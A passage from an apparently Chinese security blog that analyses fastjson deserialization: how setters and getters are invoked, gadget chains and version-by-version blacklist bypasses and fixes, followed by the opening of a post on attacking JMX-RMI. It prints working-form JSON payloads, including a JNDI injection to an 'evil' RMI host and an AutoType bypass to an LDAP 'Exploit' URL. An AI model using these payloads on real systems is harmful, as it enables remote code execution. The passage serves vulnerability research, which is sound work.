alt="image-20200106110837420"></p><p>如果不存在相应的getter、setter、is函数，则利用反射机制将value赋值到当前的object上（这里就是else部分做的事情）。</p><p>而当fieldInfo存在函数时，如果同时存在getter和setter，则调用setter，如果只存在getter则调用getter。</p><p>这里我们关注一下fieldInfo的method是怎么填充的呢？这里要看<code>com/alibaba/fastjson/util/JavaBeanInfo.java#build</code>函数，ParserConfig在<code>createJavaBeanDeserializer</code>函数中会调用<code>JavaBeanInfo.build</code>函数，以此填充fieldInfo，也就是我们需要分析的几个method。</p><p>不看具体的代码，写一下筛选的条件：</p><p>setter提取条件：</p><ul><li>函数名长度大于等于4</li><li>非静态函数</li><li>限制返回类型为void或当前类</li><li>函数参数只有一个</li><li>函数名以set开头，第四个字符是大写或者<code>unicde</code>或者<code>_</code>或者字母f；如果函数名长度&gt;=5，看第5位字符是不是大写的</li></ul><p>getter提取条件：</p><ul><li>函数名长度大于等于4</li><li>非静态函数</li><li>函数名以get开头，第四个字符大写</li><li>函数参数为0个</li><li>函数的返回类型为Collection的子类或本身、Map的子类或本身、AtomicBoolean、AtomicInteger、AtomicLong</li><li>无相对应的setter函数</li></ul><p>经过上述的两个条件提取后，保留了符合条件的getter和setter，并于<code>com/alibaba/fastjson/parser/deserializer/FieldDeserializer.java#setValue</code>函数中invoke调用，也就是说实现了类似反序列化过程中主动调用readObject函数的效果。</p><p>知道了上述的条件，其实我们可以利用传入某字段的方式来主动调用相关符合条件的setter和getter。例如在Person里面添加一个setTest函数，并在需要转化的json中添加<code>&quot;test&quot;:1</code>，将会主动调用<code>setTest</code>。</p><p>我们在利用<code>@type</code>构造有危害的利用链时，主要就是查找有危害的无参数的构造函数、符合条件的getter和setter。</p><h3 id="3-突破parse不能调用所有getters的限制"><a href="#3-突破parse不能调用所有getters的限制" class="headerlink" title="3. 突破parse不能调用所有getters的限制"></a>3. 突破parse不能调用所有getters的限制</h3><p>这里的突破思路主要有两个：</p><ol><li>tomcat bcel的poc</li><li>threedream师傅发现的<a href="https://github.com/threedr3am/learnjavabug/commit/ea61297cf7b2125ecae0064d2b8061a9e32db1e6" target="_blank" rel="noopener">引用</a>的方式</li></ol><h4 id="第一种：Tomcat-BCEL-POC思路"><a href="#第一种：Tomcat-BCEL-POC思路" class="headerlink" title="第一种：Tomcat BCEL POC思路"></a>第一种：Tomcat BCEL POC思路</h4><p>这个poc巧妙的利用了<code>JSONObject.toString</code>函数，先来看看这个<code>toString</code></p><p>这个<code>toString</code>继承自<code>JSON</code></p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200410110654354.png" alt="image-20200410110654354"></p><p>这里他直接调用了<code>toJSONString</code>函数</p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200410110738399.png" alt="image-20200410110738399"></p><p>看到后续他将当前这个JSONObject实例进行了obj to str的操作，也就是我们使用静态函数<code>JSON.toJSONString</code>来序列化数据一样，这里将会调用当前这个类的所有符合条件的getters（这里的条件比调用parse时宽松，他对返回类型无限制）。</p><p>那么我们只要在反序列化过程中，找到一处可以使用JSONObject调用toString的地方就可以了</p><p><code>com/alibaba/fastjson/parser/DefaultJSONParser.java#parseObject</code></p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200410121100651.png" alt="image-20200410121100651"></p><p>这里有一处如果当前object为JSONObject类型时，将会对当前的这个key调用<code>toString</code>函数。这里在处理过程中，我们可以知道如果遇到<code>{</code>，fastjson会加一层JSONObject。</p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200410122509759.png" alt="image-20200410122509759"></p><p>那么，我们只需要构造一个类似</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;some&#125;:x&#125;</span><br></pre></td></tr></table></figure><p>这种方式，此时的key为<code>{}</code>(也就是下一层的JSONObject)，value为<code>x</code>。我们就可以使得fastjson去调用<code>key.toString</code>函数，这个<code>toString</code>的过程也就是将key调用<code>toJSONString</code>的过程，意味着将会调用当前key对象的所有getters。到这里我们就可以使parse函数拥有与parseObject一样的执行效果，以下面的poc为例。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="comment">// 第一层JSONObject，他的key为另外一个JSONObject</span></span><br><span class="line">&#123;// 下一层JSONObject，他的内容将会调用toJSONString</span><br><span class="line">"x":&#123;// 具体触发点为getConnection</span><br><span class="line">"@type": "org.apache.tomcat.dbcp.dbcp.BasicDataSource",</span><br><span class="line">"driverClassLoader": &#123;"@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"&#125;,</span><br><span class="line">        "driverClassName": "$$BCEL$$$l$8b$I$A$..."</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;:"x"</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="第二种：-ref点"><a href="#第二种：-ref点" class="headerlink" title="第二种：$ref点"></a>第二种：<code>$ref</code>点</h4><p>当fastjson版本&gt;=1.2.36时，我们可以使用<code>$ref</code>的方式来调用任意的getter</p><p>以1.2.48版本为例，首先看一下遇到<code>$ref</code>是怎么处理的</p><p><code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject#388</code></p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200411145506512.png" alt="image-20200411145506512"></p><p>当遇到引用<code>$ref</code>这种方式，会增加一个resolveTask，留在parse结束后进行处理</p><p><code>com.alibaba.fastjson.parser.DefaultJSONParser#handleResovleTask</code></p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200411145811138.png" alt="image-20200411145811138"></p><p>调用<code>JSONPath.eval</code>，关于JSONPath的<a href="https://github.com/alibaba/fastjson/wiki/JSONPath" target="_blank" rel="noopener">介绍</a></p><p>这里的eval函数最终会去调用<code>JSONPath.getPropertyValue</code>函数（这里其实是可以根据我们传入的内容去调用不同的Segement，比如这里用了<strong>$.value</strong>的方式使用的是PropertySegement）</p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200411153340074.png" alt="image-20200411153340074"></p><p>后续就不详细分析了，这里如果存在相应的getter，就会去invoke这个函数；如果没有，那么就会用反射机制去获取属性的值。</p><p>这里举个例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">json = <span class="string">"&#123;"</span> +</span><br><span class="line">          <span class="string">"\"@type\": \"org.apache.tomcat.dbcp.dbcp.BasicDataSource\","</span> +</span><br><span class="line">          <span class="string">"\"driverClassLoader\": &#123;\"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"&#125;,"</span> +</span><br><span class="line">          <span class="string">"\"driverClassName\": \"$$BCEL$$$l$8b$I$A$...\","</span> +</span><br><span class="line">          <span class="string">"\"connection\":&#123;\"$ref\": \"$.connection\"&#125;"</span>+</span><br><span class="line"><span class="string">"&#125;"</span>;</span><br></pre></td></tr></table></figure><p>会去调用<code>getConnection</code>函数，这里也突破了parse到parseObject的效果</p><h2 id="4-private属性"><a href="#4-private属性" class="headerlink" title="(4). private属性"></a>(4). private属性</h2><p>还有一点需要注意的是默认fastjon在转化时，如果没有setter函数，而是以反射机制来赋值的情况，会忽略private属性的转化。意味着如果我们在构造过程中，填充进去的属性是private的且没有setter，那么在转化过程中是不会被填入还原后的对象的。如果需要对private属性进行转化，那么需要设置<code>Feature.SupportNonPublicField</code></p><h1 id="0x02-EXP分析"><a href="#0x02-EXP分析" class="headerlink" title="0x02 EXP分析"></a>0x02 EXP分析</h1><hr><p>相比于Java反序列化利用链构造的复杂性，fastjson利用链主要是寻找可利用的getter、setter等，常见的几种POC如下文所示：</p><h2 id="1-templatesimpl"><a href="#1-templatesimpl" class="headerlink" title="(1). templatesimpl"></a>(1). templatesimpl</h2><p>参考：<a href="http://xxlegend.com/2017/05/03/title- fastjson 远程反序列化poc的构造和分析/" target="_blank" rel="noopener">http://xxlegend.com/2017/05/03/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/</a></p><p>根据前面的分析，我们需要找到可以利用的构造函数、setter或getter函数。在分析Commons-Collections系统的利用链时，提到过templatesimpl的执行方式，通过载入bytecodes的方式来达到任意代码执行的效果(具体不再分析)。</p><p>其中触发载入的函数为<code>newTransformer</code>函数，而很巧的是，templatesimpl存在一个getter调用了该函数</p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200106232029570.png" alt="image-20200106232029570"></p><p>那么很明显，我们可以直接填入<code>outputProperties</code>的方法来触发<code>getOutputProperties</code>（他恰巧无setter，返回值也符合条件）。但是有一个问题是我们需要填充的类属性都是private类型，要想执行该利用链，需要在调用parseObject函数时填入<code>Feature.SupportNonPublicField</code>。以下图为例，将调用计算器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String jsonString = <span class="string">"&#123;\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\","</span> +</span><br><span class="line">        <span class="string">"\"_name\":\"goodjob\",\"_tfactory\":&#123;&#125;,"</span> +</span><br><span class="line">        <span class="string">"\"_bytecodes\":[\"yv66vgAAADQAOgoAA...\"],"</span> +</span><br><span class="line">        <span class="string">"\"_outputProperties\":null&#125;"</span>;</span><br></pre></td></tr></table></figure><p>这里的bytecodes可以用ysoserial工具来生成。在构造payload的时候，需要注意的是<code>_tfactory</code>必须填上，因为在执行过程中，如果它为null，会报错无法进入载入bytecodes的步骤。非常好的是，我们只要填上<code>_tfactory:{}</code>，fastjson会自动帮我们调用TransformerFactoryImpl（<em>tfactory的类）的无参构造函数进行实例化。`\</em>`在smartMatch函数被替换为空。</p><p>除此之外，byte[]类型在fastjson转化中会被base64编码</p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200106233142450.png" alt="image-20200106233142450"></p><p>所以payload中是一长串base64的字串。</p><p>可以看到这个poc其实限制还是挺大的，需要fastjson parseObject时填上<code>Feature.SupportNonPublicField</code>才可以。</p><h2 id="2-基于JNDI的利用"><a href="#2-基于JNDI的利用" class="headerlink" title="(2). 基于JNDI的利用"></a>(2). 基于JNDI的利用</h2><p>我们都知道如果JNDI的lookup函数参数值可控，那么我们可以利用JNDI Reference的方法加载远程代码达成RCE利用。所以根据前面的分析，如果我们可以在<code>无参构造函数</code>、<code>符合条件的setter</code>、<code>符合条件的getter</code>里发现一个可控的lookup函数，我们就可以利用JNDI的注入方法来达成利用。</p><h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3><p>JdbcRowSetImpl对象可以被我们用做上述的利用，来看一下他的代码</p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200407105109680.png" alt="image-20200407105109680"></p><p>这次出问题的地方在于setAutoCommit函数，该函数调用了connect函数来重新发起一个jdbc的连接</p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200407105258958.png" alt="image-20200407105258958"></p><p>在connect函数里我们可以看到调用了lookup函数，其参数值由<code>getDataSourceName</code>来获取，该函数主要返回属性<code>dataSource</code>，根据fastjson的利用原理，我们只需要填充<code>dataSource</code>和<code>autoCommit</code>就可以触发这里的JNDI注入。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,<span class="attr">"dataSourceName"</span>:<span class="string">"rmi://evil:1099/test"</span>,<span class="attr">"autoCommit"</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure><p>还有很多其他的可以用来JNDI注入的对象，比如<code>org.hibernate.jmx.StatisticsService</code>的<code>setSessionFactoryJNDIName</code>函数，原理一样不再叙述。</p><h2 id="3-Tomcat-dbcp-BasicDataSource"><a href="#3-Tomcat-dbcp-BasicDataSource" class="headerlink" title="(3). Tomcat dbcp BasicDataSource"></a>(3). Tomcat dbcp BasicDataSource</h2><p>同1中的TemplateImpl，BasicDataSource也可以载入任意的对象来执行任意代码。先来讲一下他的原理</p><p>前面的基础知识里提到了我们可以调用符合条件的getters，在<code>BasicDataSource</code>存在一个<code>getConnection</code>函数，他主要调用<code>createConnectionFactory</code></p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200411132559759.png" alt="image-20200411132559759"></p><p>在<code>createConnectionFactory</code>函数使用Class.forName加载类</p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200411132736300.png" alt="image-20200411132736300"></p><p>这部分driverClassName和driverClassLoader是可控的，这时候我们要用到的是<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>，这个ClassLoader可以从classname中提取出BCEL格式的class字节码，并调用defineClass进行载入</p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200411134429055.png" alt="image-20200411134429055"></p><p>这里我们可以写一个用了静态块的类来执行代码。</p><h1 id="0x03-Fastjson历史版本修复措施"><a href="#0x03-Fastjson历史版本修复措施" class="headerlink" title="0x03 Fastjson历史版本修复措施"></a>0x03 Fastjson历史版本修复措施</h1><hr><p>这一部分主要讲述几个重要版本的安全更新</p><h3 id="1-fastjson-1-2-25"><a href="#1-fastjson-1-2-25" class="headerlink" title="(1). fastjson == 1.2.25"></a>(1). fastjson == 1.2.25</h3><p>默认关闭<code>AutoType</code>，需要手动开启<code>@type</code>的支持，见<a href="https://github.com/alibaba/fastjson/wiki/enable_autotype" target="_blank" rel="noopener">enable_autotype</a></p><p><code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</code></p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200411232403665.png" alt="image-20200411232403665"></p><p>当遇到<code>@type</code>时，会先<code>com.alibaba.fastjson.parser.ParserConfig#checkAutoType</code>。该函数的一个主要逻辑（1.2.25版本）</p><ol><li><p>开启了<code>AutoType</code>时，会过一次黑名单和白名单检测（先检测白名单，后检测黑名单）。</p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200412223524510.png" alt="image-20200412223524510"></p><p>优先载入人工配置的白名单类，并对黑名单类爆出异常；</p></li><li><p>这里先忽略未开启<code>AutoType</code>时的检测处理</p></li><li><p>前面的情况都不符合，并且开启了<code>AutoType</code>，则尝试去载入任意类，但是不可以载入ClassLoader和DataSource的子类</p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200412224904669.png" alt="image-20200412224904669"></p></li></ol><p>这里载入的方法用的都是<code>TypeUtils.loadClass</code>，来看一下他的一个处理</p><ul><li><p>首先他对于<code>Lxxx.class.xxx;</code>的类表示方法做<code>L</code>,<code>;</code>的剔除，递归调用loadClass去调用内部的具体类</p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200412232825982.png" alt="image-20200412232825982"></p></li><li><p>后续的调用方法为使用<code>AppClassLoader.loadClass</code>或<code>Class.forName</code>去加载类</p></li></ul><h4 id="开启AutoType的情况下绕过黑名单检测"><a href="#开启AutoType的情况下绕过黑名单检测" class="headerlink" title="开启AutoType的情况下绕过黑名单检测"></a>开启<code>AutoType</code>的情况下绕过黑名单检测</h4><p>根据上面的分析，如果开启了<code>AutoType</code>，那么如果是在白名单里的类，直接加载，对于在黑名单内的类直接抛出异常。</p><p>而黑名单的检测方式是去匹配当前的类名<code>class.startsWith(deny)</code></p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200412233730761.png" alt="image-20200412233730761"></p><p>而在这个黑名单里显然并没有考虑到<code>TypeUtils.loadClass</code>实现中，对于<code>Lxxxx.class.xxx;</code>的处理。</p><p>通过<code>Lxxxxx;</code>的方式<code>startsWith</code>没办法正常匹配出来，所以我们可以绕过黑名单的检测。</p><h3 id="2-fastjson-1-2-42"><a href="#2-fastjson-1-2-42" class="headerlink" title="(2). fastjson == 1.2.42"></a>(2). fastjson == 1.2.42</h3><p>在这个版本，对上面的黑名单检测绕过做了修复，并且将黑名单里的类型进行hash处理，增加了分析难度；</p><p>对于前面<code>Lxxxxx;</code>的绕过，42版本添加了以下代码来剔除（因为黑名单已经变成了hash比较的方式，这里<code>L;</code>都以这种方式来确认）</p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200413114125856.png" alt="image-20200413114125856"></p><p>但是这里的处理治标不治本，我们使用<code>LLxxxxx;;</code>这种方式就可以绕过。</p><p>除此之外，由于现在的黑名单变成了hash计算的方式，给我们分析增加了不少难度，不过有大佬对黑名单hash做了还原见<a href="https://github.com/LeadroyaL/fastjson-blacklist" target="_blank" rel="noopener">fastjson-blacklist</a></p><h3 id="3-fastjson-1-2-43"><a href="#3-fastjson-1-2-43" class="headerlink" title="(3). fastjson == 1.2.43"></a>(3). fastjson == 1.2.43</h3><p>这个版本主要修复了上面<code>LLxxxx;;</code>的方式</p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200413125108171.png" alt="image-20200413125108171"></p><p>做了两次检测，如果碰上<code>LLxxxxx;;</code>的方式则直接爆出异常</p><h3 id="4-fastjson-1-2-48"><a href="#4-fastjson-1-2-48" class="headerlink" title="(4). fastjson == 1.2.48"></a>(4). fastjson == 1.2.48</h3><h4 id="修复前的版本"><a href="#修复前的版本" class="headerlink" title="修复前的版本"></a>修复前的版本</h4><p>在48版本之前，<code>checkAutoType</code>还存在这样一个逻辑（以1.2.47为例）</p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200413130933666.png" alt="image-20200413130933666"></p><p>当开启<code>AutoType</code>时，如果mappings里面存在这个类，那么就算这个类在黑名单里，也允许他进行下一步操作</p><p>PS：这里的mappings是fastjson提早载入的一些缓存类</p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200413131026571.png" alt="image-20200413131026571"></p><p>后续如果能从mappings里面得到这个类，就直接返回。那么我们有没有什么方法将我们需要的类加入到这个mappings里呢？</p><p>先来看一下<code>deserializers.findClass</code>，在<code>deserializers</code>里面预先填充了一些类与其反序列化器的实例</p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200413131650373.png" alt="image-20200413131650373"></p><p>这里我们主要关注一下<code>Class.class</code>，他所对应的反序列化器为<code>MiscCodec</code>，<code>checkAutoType</code>检测过后，后续将调用反序列化器的<code>deserialze</code>函数。来看看MiscCodec的这个函数对于<code>Class.class</code>的处理</p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200413132337804.png" alt="image-20200413132337804"></p><p>他调用了<code>TypeUtils.loadClass</code>函数，前面我们讲过，他将使用<code>ClassLoader.loadClass</code>或<code>Class.forName</code>来载入类，在这一过程中，涉及到了<code>mappings</code>的操作</p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200413132644597.png" alt="image-20200413132644597"></p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200413132704804.png" alt="image-20200413132704804"></p><p>这里的<code>cache</code>默认为<code>true</code>，所以这里会直接将载入后的对象填入<code>mappings</code></p><p>根据我们前面的分析，如果当前<code>mappings</code>里存在可控的类，那么不管开没开启<code>AutoType</code>，都会进行类还原；同时我们利用<code>Class.class</code>可以向<code>mappings</code>填充任意类，这导致绕过了前面的检测；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 举个例子</span></span><br><span class="line">json = <span class="string">"&#123;"</span> + <span class="comment">// 用Class载入com.sun.rowset.JdbcRowSetImpl，并缓存到mappings</span></span><br><span class="line">          <span class="string">"&#123;\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"&#125;,"</span> +</span><br><span class="line">  <span class="comment">// 后续使用mappings里的com.sun.rowset.JdbcRowSetImpl来还原对象</span></span><br><span class="line">          <span class="string">"&#123;\"@type\": \"com.sun.rowset.JdbcRowSetImpl\","</span> +</span><br><span class="line">          <span class="string">"\"dataSourceName\": \"ldap://localhost:1389/Exploit\","</span> +</span><br><span class="line">          <span class="string">"\"autoCommit\": true&#125;"</span> +</span><br><span class="line">        <span class="string">"&#125;"</span>;</span><br></pre></td></tr></table></figure><h4 id="修复后的版本"><a href="#修复后的版本" class="headerlink" title="修复后的版本"></a>修复后的版本</h4><p>在1.2.48版本上对其进行了修复</p><p>在<code>MiscCodec</code>对Class的处理中，修改了<code>cache=false</code></p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200413134143022.png" alt="image-20200413134143022"></p><p>并且对于<code>TypeUtils.loadClass</code>里的<code>mappings</code>操作都依赖于<code>cache</code>，如果为<code>false</code>则不添加到<code>mappings</code>里（在前面的版本里<code>Class.forName</code>部分并不依赖cache，48版本之后增加了对cache的判断）</p><p>与此同时，<code>java.lang.Class</code>也被加入到了黑名单里面</p><h3 id="5-后续版本"><a href="#5-后续版本" class="headerlink" title="(5). 后续版本"></a>(5). 后续版本</h3><p>后续版本的绕过主要围绕在：</p><ul><li>开启<code>AutoType</code>，绕过黑名单检测</li><li>利用<code>deserializers</code>里面的类(跟<code>Class.class</code>一个原理)</li></ul><p>最新版1.2.68引入了<a href="https://github.com/alibaba/fastjson/wiki/fastjson_safemode" target="_blank" rel="noopener">safeMode</a>，在<code>checkAutoType</code>里添加了下面判断，如果开启了safemode，那么将不允许进行<code>@type</code></p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200413161935377.png" alt="image-20200413161935377"></p><p>不过这个并不是默认开启的，需要人工去配置。</p><h3 id="6-后续版本觉得有意思的利用"><a href="#6-后续版本觉得有意思的利用" class="headerlink" title="(6). 后续版本觉得有意思的利用"></a>(6). 后续版本觉得有意思的利用</h3><ul><li><p>fastjson &lt; 1.2.60 dos <a href="http://m0d9.me/2019/09/06/Fastjson-1-2-60-Dos分析/" target="_blank" rel="noopener">Fastjson-1-2-60-Dos</a></p></li><li><p>使用dnslog来检测fastjson漏洞 <a href="https://github.com/alibaba/fastjson/issues/3077" target="_blank" rel="noopener">https://github.com/alibaba/fastjson/issues/3077</a></p><p>这里的原理跟<code>Class.class</code>是一样的，只是换成了<code>java.net.URL</code>、<code>java.net.Inet4Address</code>、<code>java.net.Inet6Address</code>，由MiscCodec处理时会去触发dns查询</p><p>当然这里的触发URL的触发用的ysoserial里面的URLDNS的方式，由hashcode去触发；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://s81twxdise25yxjinqaar74iq9wzko.burpcollaborator.net&quot;&#125;:&quot;aaa&quot;&#125;</span><br></pre></td></tr></table></figure></li></ul><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><hr><p>到这里fastjson相关的知识点就梳理结束了，这其中开发者与安全研究人员的攻防交互真是令人称快！后续如果有其他的绕过，还会继续写下去。</p><p>总结一下fastjson利用中的特色：</p><ul><li>反序列化时主动触发符合条件的setters和getters，其中使用parse和parseObject函数，在getter利用上parseObject的限制更低一点；但是这里我们可以利用本文的两种方法将parse的调用效果转化为parseObject</li><li><code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>是个好东西</li><li>fastjson的黑名单绕过来看，基本上找的都是jndi相关的利用，或许可以扩展一些其他的？</li><li>有时候开发者理解不到位，打得补丁可以轻松被绕过，所以需要紧盯补丁的情况</li></ul>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vul </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻击Java JMX-RMI</title>
      <link href="2020/03/10/java/java-jmx-rmi/"/>
      <url>2020/03/10/java/java-jmx-rmi/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>RMI的一个重要应用是JMX(Java Management Extentions)，本文介绍JMX的两个攻击面：）<br><a id="more"></a></p><h2 id="0x01-基础"><a href="#0x01-基础" class="headerlink" title="0x01 基础"></a>0x01 基础</h2><p>在写一半的时候，发现了这篇文章，感觉写的很好，可以看看：<a href="https://mogwailabs.de/blog/2019/04/attacking-rmi-based-jmx-services/" target="_blank" rel="noopener">https://mogwailabs.de/blog/2019/04/attacking-rmi-based-jmx-services/</a></p><p>JMX</p><blockquote><p>Java Management Extensions (JMX) is a Java technology that supplies tools for managing and monitoring applications, system objects, devices (such as printers) and service-oriented networks.</p></blockquote><p>MBean</p><blockquote><p>JMX allows you to manage resources as managed beans. A managed bean (MBean) is a Java Bean class that follows certain design rules of the JMX standard. An MBean can represent a device, an application, or any resource that needs to be managed over JMX. You can access these MBeans via JMX, query attributes and invoke Bean methods.</p><p>The JMX standard differs between various MBean types however, we will only deal with the standard MBeans here. To be a valid MBean, a Java class must:</p><ul><li>Implement an interface</li><li>Provide a default constructor (without any arguments)</li><li>Follow certain naming conventions, for example implement getter/setter methods to read/write attributes</li></ul></blockquote><p>这里提一下，当MBean的名字为<code>Hello</code>时，其相应的interface名必须为<code>HelloMBean</code>，不然算不合法的MBean</p><p>MBean Server</p><blockquote><p>A MBean server is a service that manages the MBeans of a system. Developers can register their MBeans in the server following a specific naming pattern. The MBean server will forward incoming messages to the registered MBeans. The service is also responsible to forward messages from MBeans to external components.</p></blockquote><p>DEMO用参考里的，用<code>jconsole</code>看看结果</p><p><img src="/images/java-jmx-rmi-20200310/image-20200306152727840-4519092.png" alt="image-20200306152727840"></p><p>在JConsole里可以对当前注册的MBean进行操作，如上图调用<code>sayHello</code>函数</p><p>当前我们连的是本地的MBean Server(每个java进程在本地都会有一个MBean Server)，我们也可以将MBean Server挂载到某一端口上，提供远程的MBean管理。</p><p>运行jar时带上<code>-Dcom.sun.management.jmxremote.port=2222 -Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.ssl=false</code></p><p>直接通过JConsole来连接，会提示你有两种方法1:<code>host:port</code>;2:<code>service:jmx:&lt;protocol&gt;:&lt;sap&gt;</code></p><p>这里我们重点要讲的就是第二种方法，首先我们先来看一下jmx建立起2222端口后，用nmap来获取其内容是怎么样的</p><p><img src="/images/java-jmx-rmi-20200310/image-20200306155425100-4519092.png" alt="image-20200306155425100"></p><p>从结果来看，JMX的MBean Server是建立在RMI的基础上的，并且其RMI Registy注册的名字叫<code>jmxrmi</code>。</p><p>第二种方法中，我们可以通过指定具体的协议来跟Server端进行连接，参考<a href="https://docs.oracle.com/javase/8/docs/api/index.html?javax/management/remote/rmi/package-summary.html" target="_blank" rel="noopener">JMX RMI connector API</a></p><blockquote><p>There are two forms for RMI connector addresses:</p><ul><li>In the <em>JNDI form</em>, the URL indicates <em>where to find an RMI stub for the connector</em>. This RMI stub is a Java object of type <a href="https://docs.oracle.com/javase/8/docs/api/javax/management/remote/rmi/RMIServer.html" target="_blank" rel="noopener"><code>RMIServer</code></a> that gives remote access to the connector server. With this address form, the RMI stub is obtained from an external directory entry included in the URL. An external directory is any directory recognized by <a href="https://docs.oracle.com/javase/8/docs/api/javax/naming/package-summary.html" target="_blank" rel="noopener"><code>JNDI</code></a>, typically the RMI registry, LDAP, or COS Naming.</li><li>In the <em>encoded form</em>, the URL directly includes the information needed to connect to the connector server. When using RMI/JRMP, the encoded form is the serialized RMI stub for the server object, encoded using BASE64 without embedded newlines. When using RMI/IIOP, the encoded form is the CORBA IOR for the server object.</li></ul></blockquote><p>这里的encoded form的反序列化过程实在发起端进行的，所以这里不考虑第二种形式。</p><p>对于JNDI的形式，有以下几种方法跟JMX Server去连接：</p><p>Connector支持JRMP和iiop作为连接层的协议，所以对应的有两种方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. service:jmx:rmi://host:port/</span><br><span class="line">2. service:jmx:iiop://host:port/</span><br></pre></td></tr></table></figure><p>此外，还有基于目录条目的connectors</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. service:jmx:rmi://host:port/jndi/jndi-name</span><br><span class="line">2. service:jmx:iiop://host:port/jndi/jndi-name</span><br><span class="line">比如</span><br><span class="line">serivce:jmx:rmi://&lt;可忽略的host&gt;/jndi/rmi://host:port/jmxrmi</span><br></pre></td></tr></table></figure><p>这种方式就可以使用jndi下的所有spi来进行连接</p><h2 id="0x02-攻击JMX"><a href="#0x02-攻击JMX" class="headerlink" title="0x02 攻击JMX"></a>0x02 攻击JMX</h2><h3 id="1-攻击JMX-RMI"><a href="#1-攻击JMX-RMI" class="headerlink" title="1. 攻击JMX-RMI"></a>1. 攻击JMX-RMI</h3><p><strong>CVE-2016-3427</strong> 